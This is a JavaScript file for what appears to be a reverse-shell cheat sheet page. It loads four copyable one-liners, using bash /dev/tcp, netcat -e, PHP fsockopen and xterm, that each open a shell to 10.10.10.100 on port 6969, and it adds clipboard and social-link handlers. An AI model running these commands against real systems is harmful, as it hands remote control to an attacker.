var myTextarea = document.getElementById("editor");
var myCodeMirror = CodeMirror.fromTextArea(myTextarea, {
    mode: "shell",
    theme: "dracula",
    lineNumbers: false,
    lineWrapping: true,
});

myCodeMirror.setValue('bash -i >& /dev/tcp/10.10.10.100/6969 0>&1')


var myTextarea = document.getElementById("editor1");
var myCodeMirror1 = CodeMirror.fromTextArea(myTextarea, {
    mode: "shell",
    theme: "dracula",
    lineNumbers: false,
    lineWrapping: true,
});

myCodeMirror1.setValue('nc -e /bin/sh 10.10.10.100 6969')


var myTextarea = document.getElementById("editor2");
var myCodeMirror2 = CodeMirror.fromTextArea(myTextarea, {
    mode: "shell",
    theme: "dracula",
    lineNumbers: false,
    lineWrapping: true,
});

myCodeMirror2.setValue('php -r \$sock=fsockopen("10.10.10.100",6969);exec("/bin/sh -i <&3 >&3 2>&3");')

var myTextarea = document.getElementById("editor3");
var myCodeMirror3 = CodeMirror.fromTextArea(myTextarea, {
    mode: "shell",
    theme: "dracula",
    lineNumbers: false,
    lineWrapping: true,
});

myCodeMirror3.setValue('xterm -display 10.10.10.100:6969')



function copyCommand1() {
    const clipboard = document.querySelector('.ri-clipboard-line');
    const copied = document.querySelector('.ri-check-line');
    const commandText = myCodeMirror.getValue();
    const textarea = document.createElement('textarea');
    textarea.value = commandText;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        clipboard.classList.toggle('clicked');
        copied.classList.toggle('clicked');

        setTimeout(() => {
            clipboard.classList.remove('clicked');
            copied.classList.remove('clicked');
        }, 3000);

    } catch (err) {
        console.error('Unable to copy text');
    } finally {
        document.body.removeChild(textarea);
    }
}

function copyCommand2() {
    const clipboard = document.querySelector('.multi-card-1 .ri-clipboard-line');
    const copied = document.querySelector('.multi-card-1 .ri-check-line');
    const commandText = myCodeMirror1.getValue();
    const textarea = document.createElement('textarea');
    textarea.value = commandText;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        clipboard.classList.toggle('clicked');
        copied.classList.toggle('clicked');

        setTimeout(() => {
            clipboard.classList.remove('clicked');
            copied.classList.remove('clicked');
        }, 3000);

    } catch (err) {
        console.error('Unable to copy text');
    } finally {
        document.body.removeChild(textarea);
    }
}

function copyCommand3() {
    const clipboard = document.querySelector('.multi-card-2 .ri-clipboard-line');
    const copied = document.querySelector('.multi-card-2 .ri-check-line');
    const commandText = myCodeMirror2.getValue();
    const textarea = document.createElement('textarea');
    textarea.value = commandText;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        clipboard.classList.toggle('clicked');
        copied.classList.toggle('clicked');

        setTimeout(() => {
            clipboard.classList.remove('clicked');
            copied.classList.remove('clicked');
        }, 3000);

    } catch (err) {
        console.error('Unable to copy text');
    } finally {
        document.body.removeChild(textarea);
    }
}

function copyCommand4() {
    const clipboard = document.querySelector('.multi-card-3 .ri-clipboard-line');
    const copied = document.querySelector('.multi-card-3 .ri-check-line');
    const commandText = myCodeMirror3.getValue();
    const textarea = document.createElement('textarea');
    textarea.value = commandText;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        clipboard.classList.toggle('clicked');
        copied.classList.toggle('clicked');

        setTimeout(() => {
            clipboard.classList.remove('clicked');
            copied.classList.remove('clicked');
        }, 3000);

    } catch (err) {
        console.error('Unable to copy text');
    } finally {
        document.body.removeChild(textarea);
    }
}

const linkedinLink = document.querySelector('.icon.linkedin');
const githubLink = document.querySelector('.icon.github');
const instagramLink = document.querySelector('.icon.instagram');
const twitterLink = document.querySelector('.icon.twitter');

linkedinLink.addEventListener('click', function () {
    window.location.href = 'https://www.linkedin.com/in/aakanshyadav';
});

githubLink.addEventListener('click', function () {
    window.location.href = 'https://github.com/your-github-username';
});

instagramLink.addEventListener('click', function () {
    window.location.href = 'https://www.instagram.com/your-instagram-profile';
});

twitterLink.addEventListener('click', function () {
    window.location.href = 'https://twitter.com/your-twitter-handle';
});
